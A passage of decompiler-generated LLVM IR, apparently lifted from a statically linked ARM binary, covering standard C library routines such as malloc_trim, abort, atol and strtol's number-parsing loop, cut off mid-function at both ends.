  %v2_13254 = add i32 %v1_13254, %v0_13254
  store i32 %v2_13254, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13258

dec_label_pc_13258:                               ; preds = %dec_label_pc_13214.dec_label_pc_13258_crit_edge, %dec_label_pc_1324c
  %v0_13268 = phi i32 [ %v0_13268.pre, %dec_label_pc_13214.dec_label_pc_13258_crit_edge ], [ %v2_13254, %dec_label_pc_1324c ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1325c = load i32, i32* @r7, align 4
  %v2_1325c = add i32 %v0_1325c, 64
  %v3_1325c = inttoptr i32 %v2_1325c to i32*
  %v4_1325c = load i32, i32* %v3_1325c, align 4
  %v1_13260 = add i32 %v4_1325c, 52
  store i32 %v1_13260, i32* %r3.global-to-local, align 4
  %v1_13264 = add i32 %v4_1325c, 60
  %v2_13264 = inttoptr i32 %v1_13264 to i32*
  %v3_13264 = load i32, i32* %v2_13264, align 4
  store i32 %v3_13264, i32* %r1.global-to-local, align 4
  %v1_13268 = or i32 %v0_13268, 1
  store i32 %v1_13268, i32* %r2.global-to-local, align 4
  %v1_1326c = load i32, i32* %r4.global-to-local, align 4
  %v2_1326c = add i32 %v1_1326c, 12
  %v3_1326c = inttoptr i32 %v2_1326c to i32*
  store i32 %v1_13260, i32* %v3_1326c, align 4
  %v0_13270 = load i32, i32* %r1.global-to-local, align 4
  %v1_13270 = load i32, i32* %r4.global-to-local, align 4
  %v2_13270 = add i32 %v1_13270, 8
  %v3_13270 = inttoptr i32 %v2_13270 to i32*
  store i32 %v0_13270, i32* %v3_13270, align 4
  %v0_13274 = load i32, i32* %r2.global-to-local, align 4
  %v1_13274 = load i32, i32* %r4.global-to-local, align 4
  %v2_13274 = add i32 %v1_13274, 4
  %v3_13274 = inttoptr i32 %v2_13274 to i32*
  store i32 %v0_13274, i32* %v3_13274, align 4
  %v0_13278 = load i32, i32* %ip.global-to-local, align 4
  %v1_13278 = load i32, i32* %r4.global-to-local, align 4
  %v3_13278 = add i32 %v1_13278, %v0_13278
  %v4_13278 = inttoptr i32 %v3_13278 to i32*
  store i32 %v0_13278, i32* %v4_13278, align 4
  %v0_1327c = load i32, i32* %r4.global-to-local, align 4
  %v1_1327c = load i32, i32* %r1.global-to-local, align 4
  %v2_1327c = add i32 %v1_1327c, 12
  %v3_1327c = inttoptr i32 %v2_1327c to i32*
  store i32 %v0_1327c, i32* %v3_1327c, align 4
  %v0_13280 = load i32, i32* %r4.global-to-local, align 4
  %v1_13280 = load i32, i32* %r3.global-to-local, align 4
  %v2_13280 = add i32 %v1_13280, 8
  %v3_13280 = inttoptr i32 %v2_13280 to i32*
  store i32 %v0_13280, i32* %v3_13280, align 4
  br label %dec_label_pc_13298

dec_label_pc_13288:                               ; preds = %dec_label_pc_131fc
  %v2_13288 = add i32 %v1_1320c, %v0_13288
  store i32 %v2_13288, i32* %ip.global-to-local, align 4
  %v1_1328c = or i32 %v2_13288, 1
  store i32 %v1_1328c, i32* %r3.global-to-local, align 4
  %v0_13290 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13290, i32* %v2_13204, align 4
  %v0_13294 = load i32, i32* %r3.global-to-local, align 4
  %v1_13294 = load i32, i32* %r4.global-to-local, align 4
  %v2_13294 = add i32 %v1_13294, 4
  %v3_13294 = inttoptr i32 %v2_13294 to i32*
  store i32 %v0_13294, i32* %v3_13294, align 4
  br label %dec_label_pc_13298

dec_label_pc_13298:                               ; preds = %dec_label_pc_13258, %dec_label_pc_13288
  %v0_13298 = load i32, i32* %ip.global-to-local, align 4
  %v3_1329c = icmp ult i32 %v0_13298, 131070
  br i1 %v3_1329c, label %dec_label_pc_13308, label %dec_label_pc_132a0

dec_label_pc_132a0:                               ; preds = %dec_label_pc_13298
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_132a4 = load i32, i32* @r7, align 4
  %v2_132a4 = add i32 %v0_132a4, 64
  %v3_132a4 = inttoptr i32 %v2_132a4 to i32*
  %v4_132a4 = load i32, i32* %v3_132a4, align 4
  store i32 %v4_132a4, i32* @r4, align 4
  %v1_132a8 = inttoptr i32 %v4_132a4 to i32*
  %v2_132a8 = load i32, i32* %v1_132a8, align 4
  store i32 %v2_132a8, i32* %r3.global-to-local, align 4
  %v1_132ac = and i32 %v2_132a8, 2
  %v2_132ac = icmp eq i32 %v1_132ac, 0
  br i1 %v2_132ac, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_132a0
  store i32 %v4_132a4, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_132a0, %bb
  %v1_132b4 = xor i1 %v2_132ac, true
  call void @__pseudo_cond_branch(i1 %v1_132b4, i32 ptrtoint (i32* @global_var_12f58.449 to i32))
  %v0_132b8 = load i32, i32* @r4, align 4
  %v1_132b8 = add i32 %v0_132b8, 44
  %v2_132b8 = inttoptr i32 %v1_132b8 to i32*
  %v3_132b8 = load i32, i32* %v2_132b8, align 4
  store i32 %v3_132b8, i32* %r3.global-to-local, align 4
  %v1_132bc = add i32 %v3_132b8, 4
  %v2_132bc = inttoptr i32 %v1_132bc to i32*
  %v3_132bc = load i32, i32* %v2_132bc, align 4
  store i32 %v3_132bc, i32* %r3.global-to-local, align 4
  %v1_132c0 = add i32 %v0_132b8, 836
  %v2_132c0 = inttoptr i32 %v1_132c0 to i32*
  %v3_132c0 = load i32, i32* %v2_132c0, align 4
  store i32 %v3_132c0, i32* %r2.global-to-local, align 4
  %v1_132c4 = and i32 %v3_132bc, -4
  store i32 %v1_132c4, i32* %r3.global-to-local, align 4
  %v3_132c8 = icmp ult i32 %v1_132c4, %v3_132c0
  br i1 %v3_132c8, label %dec_label_pc_13308, label %dec_label_pc_132d0

dec_label_pc_132d0:                               ; preds = %bb16
  store i32 %v0_132b8, i32* %r1.global-to-local, align 4
  %v1_132d4 = add i32 %v0_132b8, 840
  %v2_132d4 = inttoptr i32 %v1_132d4 to i32*
  %v3_132d4 = load i32, i32* %v2_132d4, align 4
  store i32 %v3_132d4, i32* %r0.global-to-local, align 4
  %v2_132d8 = call i32 @__malloc_trim(i32 %v3_132d4, i32 %v0_132b8)
  store i32 %v2_132d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13308

dec_label_pc_132e0:                               ; preds = %dec_label_pc_131a4
  %v2_132e0 = inttoptr i32 %v1_13174 to i32*
  %v3_132e0 = load i32, i32* %v2_132e0, align 4
  store i32 %v3_132e0, i32* %r0.global-to-local, align 4
  %v1_132e4 = add i32 %v4_13164, 848
  %v2_132e4 = inttoptr i32 %v1_132e4 to i32*
  %v3_132e4 = load i32, i32* %v2_132e4, align 4
  store i32 %v3_132e4, i32* %r2.global-to-local, align 4
  %v1_132e8 = add i32 %v4_13164, 868
  %v2_132e8 = inttoptr i32 %v1_132e8 to i32*
  %v3_132e8 = load i32, i32* %v2_132e8, align 4
  %v2_132ec = add i32 %v3_132e0, %v1_13170
  store i32 %v2_132ec, i32* %r1.global-to-local, align 4
  %v1_132f0 = add i32 %v3_132e4, -1
  store i32 %v1_132f0, i32* %r2.global-to-local, align 4
  %v2_132f4 = sub i32 %v3_132e8, %v2_132ec
  store i32 %v2_132f4, i32* %r3.global-to-local, align 4
  store i32 %v2_132f4, i32* %v2_132e8, align 4
  %v1_132fc = load i32, i32* @lr, align 4
  %v2_132fc = add i32 %v1_132fc, 848
  %v3_132fc = inttoptr i32 %v2_132fc to i32*
  store i32 %v1_132f0, i32* %v3_132fc, align 4
  %v0_13300 = load i32, i32* %r0.global-to-local, align 4
  %v1_13300 = load i32, i32* @r5, align 4
  %v2_13300 = sub i32 %v1_13300, %v0_13300
  store i32 %v2_13300, i32* %r0.global-to-local, align 4
  %v4_13304 = call i32 @munmap(i32 %v2_13300, i32 %v2_132ec, i32 %v1_132f0, i32 %v2_132f4)
  store i32 %v4_13304, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13308

dec_label_pc_13308:                               ; preds = %bb16, %dec_label_pc_13298, %dec_label_pc_132d0, %dec_label_pc_13184, %dec_label_pc_132e0
  store i32 %v2_13118, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_13314 = load i32, i32* @r7, align 4
  %v2_13314 = add i32 %v0_13314, 44
  %v3_13314 = inttoptr i32 %v2_13314 to i32*
  %v4_13314 = load i32, i32* %v3_13314, align 4
  store i32 %v4_13314, i32* %ip.global-to-local, align 4
  store i32 78624, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13314)
  br label %dec_label_pc_13320

dec_label_pc_13320:                               ; preds = %entry, %dec_label_pc_13308
  store i32 %v3_1310c, i32* @r4, align 4
  store i32 %v6_1310c, i32* @r5, align 4
  store i32 %v9_1310c, i32* @r6, align 4
  store i32 %v12_1310c, i32* @r7, align 4
  store i32 %v18_1310c, i32* @lr, align 4
  ret i32 %v2_13118

; uselistorder directives
  uselistorder i32 %v0_132b8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_13278, { 1, 0 }
  uselistorder i32 %v1_131b8, { 1, 0 }
  uselistorder i32 %v0_131b8, { 1, 0 }
  uselistorder i32 %v3_1318c, { 1, 0 }
  uselistorder i32 %v1_13170, { 1, 0, 2 }
  uselistorder i32 %v2_1316c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13164, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13114, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_13320, { 1, 0 }
  uselistorder label %dec_label_pc_13308, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_13298, { 1, 0 }
  uselistorder label %dec_label_pc_13258, { 1, 0 }
  uselistorder label %dec_label_pc_1324c, { 1, 0 }
  uselistorder label %dec_label_pc_13248, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_131fc, { 1, 0 }
}

define i32 @function_13330(i32 %arg1) local_unnamed_addr {
dec_label_pc_13330:
  %v0_13330 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13330, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13330
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13330, %bb
  %v4_13344 = phi i32 [ %arg1, %dec_label_pc_13330 ], [ 0, %bb ]
  ret i32 %v4_13344

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13348 = load i32, i32* @r4, align 4
  store i32 %v3_13348, i32* %stack_var_-12, align 4
  %v6_13348 = load i32, i32* @r5, align 4
  %v9_13348 = load i32, i32* @lr, align 4
  %v4_13358 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_13358, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_13358, i32* @r0, align 4
  %v0_13368 = call i32 @__malloc_consolidate()
  %v0_1336c = load i32, i32* @r4, align 4
  %v0_13370 = load i32, i32* @r5, align 4
  %v2_13378 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13378, i32* @r4, align 4
  store i32 %v6_13348, i32* @r5, align 4
  %sext = mul i32 %v9_13348, 65536
  %v9_13378 = sdiv i32 %sext, 65536
  store i32 %v9_13378, i32* @lr, align 4
  %v2_1337c = call i32 @__malloc_trim(i32 %v0_1336c, i32 %v0_13370)
  %v0_13380 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13380, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_13380 = load i32, i32* @lr, align 4
  %v2_13380 = trunc i32 %v1_13380 to i16
  %v4_13380 = inttoptr i32 %v2_1337c to i16*
  store i16 %v2_13380, i16* %v4_13380, align 2
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_13384 = phi i32 [ %v2_1337c, %entry ], [ 0, %bb ]
  ret i32 %v4_13384

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r5, align 4
  %v4_133a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 16) to i32*), align 4
  store i32 78764, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_133a0)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_133c8 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_133d0 = load i32, i32* @r5, align 4
  %v2_133d0 = add i32 %v0_133d0, 632
  %v3_133d0 = inttoptr i32 %v2_133d0 to i32*
  %v4_133d0 = load i32, i32* %v3_133d0, align 4
  %v2_133d4 = icmp eq i32 %v4_133d0, 0
  br i1 %v2_133d4, label %dec_label_pc_133dc, label %dec_label_pc_1341c

dec_label_pc_133dc:                               ; preds = %entry
  store i32 1, i32* %v3_133d0, align 4
  br label %dec_label_pc_133e4

dec_label_pc_133e4:                               ; preds = %dec_label_pc_1342c, %dec_label_pc_133dc
  %v0_133e8 = load i32, i32* @r5, align 4
  %v2_133e8 = add i32 %v0_133e8, 212
  store i32 %v2_133e8, i32* @r4, align 4
  %v2_133f4 = add i32 %v0_133e8, 68
  %v3_133f4 = inttoptr i32 %v2_133f4 to i32*
  %v4_133f4 = load i32, i32* %v3_133f4, align 4
  call void @__pseudo_branch(i32 %v4_133f4)
  %v1_13404 = call i32 @__GI_raise(i32 6)
  %v0_13410 = load i32, i32* @r5, align 4
  %v2_13410 = add i32 %v0_13410, 16
  %v3_13410 = inttoptr i32 %v2_13410 to i32*
  %v4_13410 = load i32, i32* %v3_13410, align 4
  store i32 78876, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13410)
  %v0_13420.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1341c

dec_label_pc_1341c:                               ; preds = %entry, %dec_label_pc_133e4
  %v1_13434 = phi i32 [ %v0_133d0, %entry ], [ %v0_13420.pre, %dec_label_pc_133e4 ]
  %v2_13420 = add i32 %v1_13434, 632
  %v3_13420 = inttoptr i32 %v2_13420 to i32*
  %v4_13420 = load i32, i32* %v3_13420, align 4
  %v7_13424 = icmp eq i32 %v4_13420, 1
  br i1 %v7_13424, label %dec_label_pc_1342c, label %dec_label_pc_13468

dec_label_pc_1342c:                               ; preds = %dec_label_pc_1341c
  %v2_1342c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1342c, i32* @r4, align 4
  store i32 2, i32* %v3_13420, align 4
  %v3_13444 = bitcast i32* %stack_var_-28 to i8*
  %v4_13444 = call i32 @__GI_memset(i8* %v3_13444, i32 0, i32 20)
  %v3_13460 = call i32 @__libc_sigaction(i32 6, i32 %v2_1342c, i32 0)
  br label %dec_label_pc_133e4

dec_label_pc_13468:                               ; preds = %dec_label_pc_1341c
  %v7_13468 = icmp eq i32 %v4_13420, 2
  br i1 %v7_13468, label %dec_label_pc_13470, label %dec_label_pc_1347c

dec_label_pc_13470:                               ; preds = %dec_label_pc_13468
  store i32 3, i32* %v3_13420, align 4
  %v0_13478 = call i32 @abort()
  %v0_1347c.pre = load i32, i32* @r5, align 4
  %v1_1347c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1347c

dec_label_pc_1347c:                               ; preds = %dec_label_pc_13468, %dec_label_pc_13470
  %v3_13488 = phi i32 [ 632, %dec_label_pc_13468 ], [ %v1_1347c.pre, %dec_label_pc_13470 ]
  %v2_13488 = phi i32 [ %v1_13434, %dec_label_pc_13468 ], [ %v0_1347c.pre, %dec_label_pc_13470 ]
  %v2_1347c = add i32 %v2_13488, %v3_13488
  %v3_1347c = inttoptr i32 %v2_1347c to i32*
  %v4_1347c = load i32, i32* %v3_1347c, align 4
  %v7_13480 = icmp eq i32 %v4_1347c, 3
  br i1 %v7_13480, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1347c
  store i32 4, i32* %v3_1347c, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1347c, %bb
  call void @__pseudo_cond_branch(i1 %v7_13480, i32 ptrtoint (i32* @global_var_15060.458 to i32))
  br label %dec_label_pc_13494

dec_label_pc_13494:                               ; preds = %dec_label_pc_13494, %.thread2
  %v0_13494 = call i32 @abort()
  br label %dec_label_pc_13494

; uselistorder directives
  uselistorder i32* %v3_13420, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1347c, { 1, 0 }
  uselistorder label %dec_label_pc_1341c, { 1, 0 }
}

define i32 @function_134a0(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_134a0:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_134a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_134a0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_134a0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_134a0, %bb
  %v4_134ac = phi i32 [ %tmp, %dec_label_pc_134a0 ], [ 0, %bb ]
  ret i32 %v4_134ac

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_134c0 = call i32 @strtol()
  ret i32 %v0_134c0
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_134dc = call i32 @_stdlib_strto_l()
  ret i32 %v0_134dc
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %ip.global-to-local, align 4
  %v0_13500 = load i32, i32* @r1, align 4
  store i32 %v0_13500, i32* %sb.global-to-local, align 4
  %v0_13504 = load i32, i32* @r2, align 4
  store i32 %v0_13504, i32* %r5.global-to-local, align 4
  %v0_13508 = load i32, i32* @r0, align 4
  store i32 %v0_13508, i32* %r4.global-to-local, align 4
  %v0_1350c = load i32, i32* @r3, align 4
  br label %dec_label_pc_13518

dec_label_pc_13514:                               ; preds = %dec_label_pc_13518
  %v1_13514 = add i32 %v0_13550, 1
  store i32 %v1_13514, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13518

dec_label_pc_13518:                               ; preds = %entry, %dec_label_pc_13514
  %v0_13550 = phi i32 [ %v0_13508, %entry ], [ %v1_13514, %dec_label_pc_13514 ]
  %v1_13518 = inttoptr i32 %v0_13550 to i8*
  %v2_13518 = load i8, i8* %v1_13518, align 1
  %v3_13518 = zext i8 %v2_13518 to i32
  store i32 %v3_13518, i32* %r1.global-to-local, align 4
  %v4_1351c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 276) to i32*), align 4
  %v2_13520 = mul nuw nsw i32 %v3_13518, 2
  %v2_13524 = add i32 %v2_13520, %v4_1351c
  %v3_13524 = inttoptr i32 %v2_13524 to i16*
  %v4_13524 = load i16, i16* %v3_13524, align 2
  %v1_13528 = and i16 %v4_13524, 32
  %v2_13528 = icmp eq i16 %v1_13528, 0
  br i1 %v2_13528, label %dec_label_pc_13530, label %dec_label_pc_13514

dec_label_pc_13530:                               ; preds = %dec_label_pc_13518
  %v7_13530 = icmp eq i8 %v2_13518, 43
  br i1 %v7_13530, label %dec_label_pc_13550, label %dec_label_pc_13538

dec_label_pc_13538:                               ; preds = %dec_label_pc_13530
  %v7_13538 = icmp eq i8 %v2_13518, 45
  br i1 %v7_13538, label %dec_label_pc_13550, label %bb

bb:                                               ; preds = %dec_label_pc_13538
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13554

dec_label_pc_13550:                               ; preds = %dec_label_pc_13530, %dec_label_pc_13538
  %storemerge47 = phi i32 [ 1, %dec_label_pc_13538 ], [ 0, %dec_label_pc_13530 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_13550 = add i32 %v0_13550, 1
  store i32 %v1_13550, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13554

dec_label_pc_13554:                               ; preds = %bb, %dec_label_pc_13550
  %v0_13574 = phi i32 [ %v0_13550, %bb ], [ %v1_13550, %dec_label_pc_13550 ]
  %v1_13554 = and i32 %v0_13504, -17
  %v3_13554 = icmp eq i32 %v1_13554, 0
  br i1 %v3_13554, label %dec_label_pc_13560, label %bb60

bb60:                                             ; preds = %dec_label_pc_13554
  br label %bb64

dec_label_pc_13560:                               ; preds = %dec_label_pc_13554
  %v1_13560 = inttoptr i32 %v0_13574 to i8*
  %v2_13560 = load i8, i8* %v1_13560, align 1
  %v7_13564 = icmp eq i8 %v2_13560, 48
  %v1_13568 = add i32 %v0_13504, 10
  store i32 %v1_13568, i32* %r5.global-to-local, align 4
  br i1 %v7_13564, label %dec_label_pc_13574, label %bb61

bb61:                                             ; preds = %dec_label_pc_13560
  br label %.thread8

dec_label_pc_13574:                               ; preds = %dec_label_pc_13560
  %v1_13574 = add i32 %v0_13574, 1
  %v2_13574 = inttoptr i32 %v1_13574 to i8*
  %v3_13574 = load i8, i8* %v2_13574, align 1
  %v4_13574 = zext i8 %v3_13574 to i32
  store i32 %v1_13574, i32* %r4.global-to-local, align 4
  %v1_13578 = or i32 %v4_13574, 32
  %v7_1357c = icmp eq i32 %v1_13578, 120
  %v1_13580 = add i32 %v0_13504, 8
  store i32 %v1_13580, i32* %r5.global-to-local, align 4
  br i1 %v7_1357c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_13574
  %v3_1358c = mul i32 %v1_13580, 2
  store i32 %v3_1358c, i32* %r5.global-to-local, align 4
  %v2_13590 = add i32 %v0_13574, 2
  store i32 %v2_13590, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13574, %bb61, %bb62
  %v1_1366430 = phi i32 [ %v0_13508, %bb61 ], [ %v1_13574, %bb62 ], [ %v1_13574, %dec_label_pc_13574 ]
  %v0_135e021 = phi i32 [ %v0_13574, %bb61 ], [ %v2_13590, %bb62 ], [ %v1_13574, %dec_label_pc_13574 ]
  %v0_13594 = phi i32 [ %v1_13568, %bb61 ], [ %v3_1358c, %bb62 ], [ %v1_13580, %dec_label_pc_13574 ]
  %v5_13598 = icmp slt i32 %v0_13594, 16
  br i1 %v5_13598, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1366429 = phi i32 [ %v0_13508, %bb60 ], [ %v1_1366430, %.thread8 ], [ %v1_1366430, %bb63 ]
  %v0_135e020 = phi i32 [ %v0_13574, %bb60 ], [ %v0_135e021, %.thread8 ], [ %v0_135e021, %bb63 ]
  %v0_135c0 = phi i32 [ %v0_13504, %bb60 ], [ %v0_13594, %.thread8 ], [ 16, %bb63 ]
  %v1_1359c = add i32 %v0_135c0, -2
  %tmp = icmp ugt i32 %v1_1359c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_135ac

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13660

dec_label_pc_135ac:                               ; preds = %bb64
  %v2_135b4 = udiv i32 -1, %v0_135c0
  %v3_135b4 = urem i32 -1, %v0_135c0
  store i32 %v0_135c0, i32* %r1.global-to-local, align 4
  %v1_135c4 = urem i32 %v3_135b4, 256
  store i32 %v1_135c4, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_135b4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_135e0

dec_label_pc_135dc:                               ; preds = %bb71, %dec_label_pc_1363c
  %v0_135dc = phi i32 [ %v1_1361c44, %bb71 ], [ %v0_135dc.pre, %dec_label_pc_1363c ]
  br label %dec_label_pc_135e0

dec_label_pc_135e0:                               ; preds = %dec_label_pc_135ac, %dec_label_pc_135dc
  %v1_1366427 = phi i32 [ %v1_1366429, %dec_label_pc_135ac ], [ %v0_135dc, %dec_label_pc_135dc ]
  %v0_1361c = phi i32 [ %v0_135e020, %dec_label_pc_135ac ], [ %v0_135dc, %dec_label_pc_135dc ]
  %v1_135e0 = inttoptr i32 %v0_1361c to i8*
  %v2_135e0 = load i8, i8* %v1_135e0, align 1
  %v3_135e0 = zext i8 %v2_135e0 to i32
  %v1_135e4 = add nsw i32 %v3_135e0, -48
  %v1_135e8 = urem i32 %v1_135e4, 256
  store i32 %v1_135e8, i32* %r1.global-to-local, align 4
  %v1_135f0 = or i32 %v3_135e0, 32
  %tmp79 = icmp ult i32 %v1_135e8, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_135f8

dec_label_pc_135f8:                               ; preds = %dec_label_pc_135e0
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_135f0, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_135f8
  %v1_135fc = add nsw i32 %v1_135f0, -87
  %v5_13604 = urem i32 %v1_135fc, 256
  store i32 %v5_13604, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_135e0, %dec_label_pc_135f8, %bb65
  %v3_13634 = phi i32 [ %v1_135e8, %dec_label_pc_135e0 ], [ 40, %dec_label_pc_135f8 ], [ %v5_13604, %bb65 ]
  %v1_13608 = load i32, i32* %r5.global-to-local, align 4
  %v6_1360c = icmp slt i32 %v3_13634, %v1_13608
  br i1 %v6_1360c, label %dec_label_pc_13610, label %dec_label_pc_13660.loopexit

dec_label_pc_13610:                               ; preds = %bb66
  %v0_13610 = load i32, i32* %ip.global-to-local, align 4
  %v1_13610 = load i32, i32* %r8.global-to-local, align 4
  %v9_13610 = icmp eq i32 %v0_13610, %v1_13610
  br i1 %v9_13610, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_13610
  %v1_1361c40 = add i32 %v0_1361c, 1
  store i32 %v1_1361c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13624

bb67:                                             ; preds = %dec_label_pc_13610
  %v3_13610 = icmp ult i32 %v0_13610, %v1_13610
  %v1_1361c = add i32 %v0_1361c, 1
  store i32 %v1_1361c, i32* %r4.global-to-local, align 4
  br i1 %v3_13610, label %dec_label_pc_13624, label %dec_label_pc_1363c

dec_label_pc_13624:                               ; preds = %bb67, %.thread39
  %v1_1361c44 = phi i32 [ %v1_1361c40, %.thread39 ], [ %v1_1361c, %bb67 ]
  %v4_1362c2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_13624 = load i32, i32* %sl.global-to-local, align 4
  %v3_13624 = icmp uge i32 %v3_13634, %v1_13624
  %v9_13624 = icmp eq i32 %v3_13634, %v1_13624
  %v2_13628 = xor i1 %v3_13624, true
  %v3_13628 = or i1 %v9_13624, %v2_13628
  br i1 %v3_13628, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_13624
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_13624, %bb68
  %v4_1362c = phi i32 [ %v4_1362c2443, %dec_label_pc_13624 ], [ 0, %bb68 ]
  %v2_1362c = xor i1 %v9_13624, true
  %v3_1362c = and i1 %v3_13624, %v2_1362c
  br i1 %v3_1362c, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_1362c = urem i32 %v4_1362c, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_13630 = phi i32 [ %v5_1362c, %bb70 ], [ %v4_1362c, %bb69 ]
  %v2_13630 = icmp eq i32 %v0_13630, 0
